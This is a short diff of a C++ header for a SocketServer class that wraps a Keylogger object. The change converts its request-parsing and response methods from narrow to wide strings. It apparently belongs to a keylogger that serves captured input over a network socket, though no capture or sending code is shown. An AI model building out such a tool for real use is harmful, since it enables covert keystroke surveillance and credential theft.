@@ -22,11 +22,11 @@ private:
 	std::string hostName;
 
 	void initHostInfo();
-	static std::vector<std::string> parseRequest(std::string request);
+	static std::vector<std::wstring> parseRequest(std::wstring request);
 public:
 	SocketServer(Keylogger* logger);
 	void start();
-	std::string getResponse(std::string request);
+	std::wstring getResponse(std::wstring request);
 	std::string getHostName();
 };
 
